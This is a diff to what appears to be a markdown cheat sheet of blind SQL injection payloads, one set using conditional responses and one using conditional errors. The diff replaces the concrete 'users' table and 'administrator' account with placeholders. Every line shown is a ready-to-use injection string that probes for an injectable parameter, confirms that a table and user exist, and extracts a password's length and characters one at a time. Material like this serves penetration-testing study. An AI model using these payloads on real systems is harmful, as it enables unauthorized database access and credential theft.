@@ -52,16 +52,16 @@
 #### With Conditional Responses
 ```
 ● checking parameter vuln       : ' AND 1=1 --
-● checking table existence      : ' AND (SELECT 'a' FROM users LIMIT 1)='a' --
-● checking user existence       : ' AND (SELECT 'a' FROM users WHERE username='administrator')='a' --
-● checking password length      : ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'
-● checking password             : ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'
+● checking table existence      : ' AND (SELECT 'a' FROM put_table_name_here LIMIT 1)='a' --
+● checking user existence       : ' AND (SELECT 'a' FROM put_table_name_here WHERE username='put_username_here')='a' --
+● checking password length      : ' AND (SELECT 'a' FROM put_table_name_here WHERE username='put_username_here' AND LENGTH(password)>1)='a'
+● checking password             : ' AND (SELECT SUBSTRING(password,1,1) FROM put_table_name_here WHERE username='put_username_here')='a'
 ```
 #### With Conditional Errors
 ```
 ● checking parameter vuln       : ' || (SELECT NULL FROM dual) || ' --
 ● checking table existence      : ' || (SELECT NULL FROM put_table_name_here WHERE ROWNUM = 1) || ' --
 ● checking user existence       : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM put_table_name_here WHERE username='put_username_here') || ' --
-● checking password length      : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' AND LENGTH(password)>1 ) || ' --
-● checking password             : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a' ) || ' --
+● checking password length      : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM put_table_name_here WHERE username='put_username_here' AND LENGTH(password)>1 ) || ' --
+● checking password             : ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM put_table_name_here WHERE username='put_username_here' AND SUBSTR(password,1,1)='a' ) || ' --
 ```
